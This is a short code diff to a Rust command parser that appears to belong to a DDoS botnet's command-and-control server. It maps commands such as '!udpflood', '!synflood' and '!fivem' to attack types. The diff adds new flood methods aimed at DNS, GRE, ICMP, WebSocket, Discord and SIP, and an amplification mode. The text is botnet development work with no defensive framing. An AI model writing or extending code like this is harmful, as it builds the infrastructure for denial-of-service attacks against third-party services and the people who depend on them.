@@ -98,10 +98,18 @@ pub fn validate_attack_method(method: &str) -> Result<String> {
     // Legacy compatibility mapping
     let mapped = match method.to_lowercase().as_str() {
         "!udpflood" | "!udpsmart" => "UDP",
+        "!udpmax" => "UDPMAX",
         "!tcpflood" => "TCP",
         "!http" => "HTTP",
         "!synflood" => "SYN",
         "!ackflood" => "ACK",
+        "!greflood" => "GRE",
+        "!icmpflood" => "ICMP",
+        "!dns" => "DNS",
+        "!dnsl4" => "DNSL4",
+        "!websocket" => "WEBSOCKET",
+        "!amplification" => "AMPLIFICATION",
+        "!connection" => "CONNECTION",
         "!slowloris" => "SLOWLORIS",
         "!sslflood" | "!tls" => "TLS",
         "!vse" => "VSE",
@@ -113,6 +121,8 @@ pub fn validate_attack_method(method: &str) -> Result<String> {
         "!raknet" => "RAKNET",
         "!fivem" => "FIVEM",
         "!ts3" | "!teamspeak" => "TS3",
+        "!discord" => "DISCORD",
+        "!sip" => "SIP",
         _ => {
             return Err(CncError::InvalidCommand(
                 format!("Unknown attack method: {}. Type 'methods' to see available methods", method)
